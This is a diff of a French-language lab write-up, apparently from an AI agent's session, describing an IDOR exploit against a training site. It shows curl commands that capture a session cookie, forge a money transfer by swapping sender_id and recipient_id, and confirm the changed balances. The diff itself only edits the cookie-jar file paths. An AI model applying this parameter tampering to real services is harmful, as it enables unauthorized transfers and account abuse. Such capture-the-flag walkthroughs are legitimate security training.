@@ -38,19 +38,19 @@
 *   **Étape 1 : Récupération du Cookie de Session (PHPSESSID)**
     *   Une requête `GET` a été envoyée à l'URL principale pour demander la page et capturer tout cookie `PHPSESSID` défini par le serveur. Les cookies ont été sauvegardés dans un fichier temporaire (`cookiejar.txt`).
     ```bash
-    curl -s -c "/home/aurel/.gemini/tmp/091625b5c4be2ac601a01064fd23cdc48d63136239a5aebd676191c3619b5def/cookiejar.txt" https://legal-ultimatum.europe1.hackviser.space
+    curl -s -c "/home/aurel/./tmp/091625b5c4be2ac601a01064fd23cdc48d63136239a5aebd676191c3619b5def/cookiejar.txt" https://legal-ultimatum.europe1.hackviser.space
     ```
     *   Résultat : Un fichier `cookiejar.txt` a été créé, contenant le `PHPSESSID` généré pour cette session.
 *   **Étape 2 : Exécution de la Requête POST IDOR avec le Cookie de Session**
     *   La requête `POST` de transfert d'argent a été réexécutée, cette fois en incluant le cookie `PHPSESSID` capturé à l'étape précédente. L'IDOR a été appliqué en définissant `sender_id=2` et `recipient_id=1`.
     ```bash
-    curl -s -b "/home/aurel/.gemini/tmp/091625b5c4be2ac601a01064fd23cdc48d63136239a5aebd676191c3619b5def/cookiejar.txt" -X POST -d "transfer_amount=500&recipient_id=1&sender_id=2" https://legal-ultimatum.europe1.hackviser.space
+    curl -s -b "/home/aurel/./tmp/091625b5c4be2ac601a01064fd23cdc48d63136239a5aebd676191c3619b5def/cookiejar.txt" -X POST -d "transfer_amount=500&recipient_id=1&sender_id=2" https://legal-ultimatum.europe1.hackviser.space
     ```
     *   Résultat : La requête `POST` a été envoyée avec succès (sortie vide, car le serveur a probablement renvoyé un `302 Found` comme précédemment).
 *   **Étape 3 : Vérification du Transfert (Page d'Accueil)**
     *   Une nouvelle requête `GET` a été effectuée sur la page principale de transfert, en utilisant à nouveau le même cookie de session, pour vérifier si les montants des comptes avaient été mis à jour.
     ```bash
-    curl -s -b "/home/aurel/.gemini/tmp/091625b5c4be2ac601a01064fd23cdc48d63136239a5aebd676191c3619b5def/cookiejar.txt" https://legal-ultimatum.europe1.hackviser.space
+    curl -s -b "/home/aurel/./tmp/091625b5c4be2ac601a01064fd23cdc48d63136239a5aebd676191c3619b5def/cookiejar.txt" https://legal-ultimatum.europe1.hackviser.space
     ```
     *   Résultat : Le HTML de la page d'accueil a confirmé que les soldes des comptes avaient changé :
         *   **User 1 :** 1500 $ (au lieu de 1000 $)
@@ -63,7 +63,7 @@
 *   **Commande `GET` de la page de succès :**
     *   Une requête `GET` a été envoyée à l'URL `https://legal-ultimatum.europe1.hackviser.space/index.php?message=success`, toujours avec le cookie de session.
     ```bash
-    curl -s -b "/home/aurel/.gemini/tmp/091625b5c4be2ac601a01064fd23cdc48d63136239a5aebd676191c3619b5def/cookiejar.txt" "https://legal-ultimatum.europe1.hackviser.space/index.php?message=success"
+    curl -s -b "/home/aurel/./tmp/091625b5c4be2ac601a01064fd23cdc48d63136239a5aebd676191c3619b5def/cookiejar.txt" "https://legal-ultimatum.europe1.hackviser.space/index.php?message=success"
     ```
 *   **Résultat :** Le code HTML de cette page contenait enfin l'ID de transaction :
     ```html
